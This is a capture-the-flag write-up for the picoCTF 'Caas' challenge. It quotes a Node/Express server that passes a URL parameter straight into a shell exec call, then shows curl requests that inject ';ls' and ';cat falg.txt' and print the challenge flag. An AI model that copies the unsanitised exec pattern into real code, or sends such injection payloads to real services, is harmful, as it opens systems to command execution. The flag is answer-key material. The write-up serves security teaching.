# **_Caas_**
## Description
Now presenting cowsay as a service
## Solution
Anaylse `index.js`, notice that the input isn't filtered and is executed directly
```js
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});
```
Lets do a command injection, send `x;ls` as the message, so that the command becomes `exec('/usr/games/cowsay x;ls')`
```console
❯ curl https://caas.mars.picoctf.net/cowsay/t\;ls
 ___
< t >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```
The `ls` command returns a filename `falg.txt`, read it and get the flag, make sure to replace `whitespace` with `%20` for `urlencode`
```console
❯ curl https://caas.mars.picoctf.net/cowsay/t\;cat%20falg.txt
 ___
< t >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```